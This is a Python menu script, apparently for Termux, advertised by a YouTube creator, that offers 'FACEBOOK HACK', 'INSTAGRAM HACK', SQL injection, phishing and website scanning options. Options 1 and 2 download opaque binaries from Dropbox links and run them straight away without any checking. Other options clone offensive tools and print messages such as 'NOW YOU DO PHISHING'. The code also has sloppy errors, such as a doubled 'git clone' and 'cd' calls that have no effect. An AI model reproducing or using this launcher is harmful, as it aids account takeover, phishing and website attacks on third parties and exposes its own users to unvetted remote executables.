import os

def menu():

    print(""" 
	 ..######..########....###....########..##....##
	 .##....##....##......##.##...##.....##.##...##.
	 .##..........##.....##...##..##.....##.##..##..
	 ..######.....##....##.....##.########..#####...
	 .......##....##....#########.##...##...##..##..
	 .##....##....##....##.....##.##....##..##...##.
	 ..######.....##....##.....##.##.....##.##....##

>>CREATED BY:ANIKETSTARK
>>SUBSCRIBE CHANNEL:HTTPS://YOUTUBE.COM/C/ANIKETSTARK

>>THIS IS VIDEO BETA VERSION<<
>>>ONLY FOR TERMUX<<<

===============================================
1. FACEBOOK HACK
2. INSTAGRAM HACK
3. LAZYMUX
4. RED_HAWK
5. SQL INJECTION
6. WEEMAN
7. SQL WEBSITE SCANNER
================================================
8. EXIT
""")

loop = True

while loop:
    menu()
    what = input ( "stark: " )
    if what == "1" :
	    os.system("cd /data/data/com.termux/files/home")
	    os.system("apt -y update")
	    os.system("pkg -y install wget python2" )
	    os.system("wget https://www.dropbox.com/s/dygbg1y8kojc4rr/fb" )
	    os.system("chmod +x fb" )
	    os.system("./fb" )
	    rmenu = input( "Back to Menu? (y/n): ")
	    if rmenu == "y" :
	        menu()
	    else:
	        break
	
    elif what == "2" :
	    os.system("cd /data/data/com.termux/files/home")
	    os.system("wget https://www.dropbox.com/s/1sjot5w4af4t17o/instahack")
	    os.system("chmod +x instahack")
	    os.system("./instahack")
	    os.system("rm -r instahack")
	    rmenu = input( "Back to menu? (y/n): ")
	    if rmenu == "y" :
	       menu()
	    else:
       	        break
	
    elif what == "3" :
        os.system("cd /data/data/com.termux/files/home")
        os.system("git clone https://github.com/Gameye98/Lazymux")
        print("this script inspire by lazymux")
        rmenu = input( " Back to menu? (y/n): ")
        if rmenu == "y" :
            menu()
        else:
                break
        
    elif what == "4" :
         os.system("cd /data/data/com.termux/files/home")
         os.system("git clone git clone https://github.com/Tuhinshubhra/RED_HAWK")
         print("NOW GO TO REDHAWK AND RUN WITH PHP LIKE php rhawk.php")
         rmenu = input( " Back to menu? (y/n): ")
         if rmenu == "y" :
         	 menu()
         else:
         	break
         
    elif what == "5" :
         os.system("cd /data/data/com.termux/files/home")
         os.system("git clone https://github.com/sqlmapproject/sqlmap")
         print("NOW YOU HACK WEBSITE SQL DATA")
         rmenu = input( " Back to menu? (y/n): ")
         if rmenu == "y" :
         	 menu()
         else:
                break
         
    elif what == "6" :
         os.system("cd /data/data/com.termux/files/home")
         os.system("git clone https://github.com/evait-security/weeman")
         print("NOW YOU DO PHISHING")
         rmenu = input( "Back to menu? (y/n: ")
         if rmenu == "y" :
         	 menu()
         else:
         	break
         
    elif what =="7" :
         os.system("cd $HOME")
         os.system("git clone https://github.com/Cvar1984/sqlscan.git/")
         print("NOW SCAN SQL ERROR IN WEBSITE")
         rmenu = input("Back to menu? (y/n): ")
         if rmenu == "y" :
              menu()
         else:
         	break
         
    elif what == "8" :
         print("I WILL ADD  MORE SOON")
         print("BYE.")
         break
